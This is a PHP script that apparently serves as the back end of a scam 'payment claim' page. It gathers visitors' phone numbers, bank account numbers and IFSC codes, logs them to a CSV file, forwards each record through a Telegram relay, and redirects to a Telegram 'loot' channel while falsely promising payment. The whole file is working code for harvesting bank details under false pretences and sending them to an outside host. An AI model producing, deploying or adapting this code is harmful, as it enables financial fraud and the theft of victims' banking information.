<?php
include "config.php";

// Get form data
$phone      = $_POST['phone'] ?? 'N/A';
$account_no = $_POST['account_no'] ?? 'N/A';
$ifsc_code  = $_POST['ifsc_code'] ?? 'N/A';
$time       = date("Y-m-d H:i:s");
$claim      = "₹" . $claim_amount;

// ----------------- CHECK TOTAL CLAIMS -----------------
$total_claims = 0;
$already_claimed = false;

if (file_exists($csv_file)) {
    $data = array_map('str_getcsv', file($csv_file));
    $total_claims = count($data);

    // Check if account number already used
    foreach ($data as $row) {
        if (isset($row[1]) && trim($row[1]) === trim($account_no)) {
            $already_claimed = true;
            break;
        }
    }
}

// ----------------- CHECK IF SAME BANK USED -----------------
if ($already_claimed) {
    echo "<!DOCTYPE html>
    <html lang='en'>
    <head>
    <meta charset='UTF-8'>
    <title>Duplicate Bank</title>
    <style>
    body {
        margin: 0;
        font-family: 'Inter', sans-serif;
        background: linear-gradient(135deg,#0f1722,#0b3b2e);
        color: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }
    .popup {
        background: rgba(0,0,0,0.85);
        padding: 50px;
        border-radius: 20px;
        text-align: center;
        box-shadow: 0 10px 50px rgba(0,0,0,0.7);
        max-width: 700px;
    }
    h1 {
        color: #f1c40f;
        font-size: 48px;
        margin-bottom: 20px;
    }
    p {
        font-size: 24px;
        margin: 10px 0;
    }
    </style>
    </head>
    <body>
    <div class='popup'>
        <h1>⚠ 1 Bank 1 Time!</h1>
        <p>Try another bank account.</p>
    </div>
    </body>
    </html>";
    exit();
}

// ----------------- CHECK LIMIT -----------------
if ($total_claims >= $total_claim_limit) {
    echo "<!DOCTYPE html>
    <html lang='en'>
    <head><meta charset='UTF-8'><title>Limit Reached</title>
    <style>
    body{margin:0;font-family:'Inter',sans-serif;background:linear-gradient(135deg,#0f1722,#0b3b2e);color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;}
    .container{background:rgba(0,0,0,0.85);padding:40px;border-radius:15px;width:100%;max-width:600px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.6);}
    h1{color:#e74c3c;font-size:48px;margin-bottom:20px;}
    p{font-size:22px;}
    </style>
    </head>
    <body>
    <div class='container'>
    <h1>⚠ Claim Limit Reached!</h1>
    <p>Sorry, all claims have been completed.</p>
    <p>Total Claims: $total_claims / $total_claim_limit</p>
    </div>
    </body>
    </html>";
    exit();
}

// ----------------- SAVE TO CSV -----------------
$line = [$phone, $account_no, $ifsc_code, $claim, $time];
$f = fopen($csv_file, 'a');
fputcsv($f, $line);
fclose($f);

// ----------------- TELEGRAM ALERT -----------------
$message = "📱 Phone: $phone\n"
         . "🏦 Account: $account_no\n"
         . "🔢 IFSC: $ifsc_code\n"
         . "💰 Claim: $claim\n"
         . "🕒 Time: $time\n"
         . "📍 Total Claims So Far: " . ($total_claims + 1);

$relay_url = $telegram_relay_url . "?chat_id=" . $chat_id . "&msg=" . urlencode($message);
file_get_contents($relay_url);
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="3;url=https://t.me/EARNPAYTMLOOT0">
<title>Success</title>
<style>
body{margin:0;font-family:'Inter',sans-serif;background:linear-gradient(135deg,#0f1722,#0b3b2e);color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;}
.container{background:rgba(0,0,0,0.85);padding:50px;border-radius:20px;width:100%;max-width:700px;text-align:center;box-shadow:0 10px 50px rgba(0,0,0,0.7);}
h1{color:#2ecc71;font-size:60px;margin-bottom:25px;}
p{font-size:26px;margin:10px 0;line-height:1.5;}
</style>
</head>
<body>
<div class="container">
<h1>✅ Submitted Successfully!</h1>
<p>Please wait. You will receive your payment soon in your bank account.</p>
<p>Total Claims So Far: <?= $total_claims + 1 ?> / <?= $total_claim_limit ?></p>
</div>
</body>
</html>